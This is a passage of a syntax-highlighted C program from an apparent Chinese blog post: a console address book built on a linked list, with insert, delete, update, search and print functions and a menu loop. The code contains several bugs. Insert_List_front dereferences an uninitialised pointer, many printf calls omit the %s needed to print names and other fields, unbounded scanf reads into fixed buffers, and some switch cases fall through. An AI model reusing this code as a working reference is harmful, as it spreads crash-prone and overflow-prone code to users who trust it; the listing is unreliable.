class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//四、删除记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dele_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p = L-&gt;next;</span><br><span class="line">    List *q = L;  <span class="comment">//使 q 始终指向 p 的前一个结点</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要删除的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;  <span class="comment">//查找 需要删除的节点位置 p</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        q-&gt;next = p-&gt;next;<span class="comment">//删除 p 所指结点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;您所删除的信息是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>,p-&gt;data.group);</span><br><span class="line">        <span class="built_in">free</span>(p);<span class="comment">//释放空间</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人信息！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//五、插入记录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q,*r,*node;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要插入的记录 ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入结点信息：\n&quot;</span>);</span><br><span class="line">judge:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断 ID 是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID,node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">NULL</span>) <span class="comment">//ID 重复</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.group));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果没有该ID</span></span><br><span class="line"><span class="keyword">int</span> select1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将新节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select1);</span><br><span class="line"><span class="keyword">if</span> (select1 == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//给新节点分配空间</span></span><br><span class="line">node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line"><span class="comment">//给新节点输入数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">judge1:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断ID是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复,请重新输入!\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">node-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next = node;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//六、插入记录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_behind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">List *p, *r, *q, *node;</span><br><span class="line">p = L-&gt;next;</span><br><span class="line">q = L;</span><br><span class="line"><span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的位置(输入该位置的ID)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;ID);</span><br><span class="line"><span class="keyword">while</span> (p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">q = q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//为新节点分配空间</span></span><br><span class="line">node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line"><span class="comment">//为新节点输入数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">judge:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断ID是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">node-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = node;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//通讯录中未找到该ID</span></span><br><span class="line"><span class="keyword">int</span> select2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将该节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select2);</span><br><span class="line"><span class="keyword">if</span> (select2 == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//为新节点分配空间</span></span><br><span class="line">node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line"><span class="comment">//为新节点录入信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">judge1:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断ID是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">node-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next = node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (select2 == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//七、修改通讯录记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> select;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的属性：（1.姓名 2.性别 3.电话 4.住址 5.分组）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的姓名：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.name));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的性别：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.sex));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的电话：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.tele));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的住址：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.add));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的分组：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.group));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;更新成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在该 ID！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//八、查找记录（根据ID）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要查找的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//九、打印输出所有记录  遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Printall_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = L-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中的全部记录如下：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//十、释放 链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Destroy_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p;<span class="comment">//使用 q 暂时存放当前结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(L);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;释放成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单界面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t\t*********************简易通讯录*******************\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t1.初始化通讯录                          5.查找联系人\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t2.创建通讯录                      6.插入联系人\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t3.删除联系人                      7.遍历通讯录\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t4.修改联系人                      8.释放通讯录\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t********************* 0 为退出 *******************\n&quot;</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;使用说明：为了您的正常使用，请按照顺序进行操作！！！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先请初始化；随后请创建通讯录！！！之后可进行 删除、修改、查找、插入、遍历等操作；最后请释放通讯录！！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//system(&quot;cls&quot;);</span></span><br><span class="line">        Menu();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择菜单：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">switch</span>(select)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                &#123;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">                    Init_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                &#123;</span><br><span class="line"><span class="comment">//创建通讯录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择创建方式(1.前插法 2.尾插法)：&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Creat_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Creat_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//删除记录</span></span><br><span class="line">                    Dele_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//修改记录</span></span><br><span class="line">                    Update_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//查找记录</span></span><br><span class="line">                    Find_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//插入记录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择插入方式(1.前插法 2.尾插法)&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Insert_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Insert_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//遍历</span></span><br><span class="line">                    Printall_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//释放</span></span><br><span class="line">                    Destroy_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/15/KdJ6nYGcFESbrhP.png" alt="image-20211015165430030"></p><p><img src="https://i.loli.net/2021/10/15/plQ1m5XRcCDOtHJ.png" alt="image-20211015165636809"></p><p><img src="https://i.loli.net/2021/10/15/6lhzZMNEI3XYrP9.png" alt="image-20211015165510697"></p><p><img 